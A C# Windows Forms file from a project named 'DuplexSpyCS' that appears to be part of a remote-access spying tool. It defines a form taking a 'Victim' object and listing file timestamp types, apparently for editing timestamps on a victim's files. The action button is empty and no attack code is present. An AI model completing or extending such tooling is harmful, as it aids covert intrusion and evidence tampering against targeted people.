using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileDatetime : Form
    {
        private string m_szCurrentPath;
        private string m_szFilename;

        private enum FileTimestampType
        {
            CreationTime,
            LastModifiedTime,
            LastAccessedTime,
        }

        public frmFileDatetime(Victim v, string szCurrentPath, string szFilename, bool bFile)
        {
            InitializeComponent();

            m_szCurrentPath = szCurrentPath;
            m_szFilename = szFilename;
        }

        private void fnSetup()
        {
            textBox1.ReadOnly = true;
            textBox1.Text = m_szFilename;

            foreach (string szName in Enum.GetNames(typeof(FileTimestampType)))
                comboBox1.Items.Add(szName);

            if (comboBox1.Items.Count > 0)
                comboBox1.SelectedIndex = 0;

            Text = "EntityTimestamp";
        }

        private void frmFileDatetime_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }
    }
}
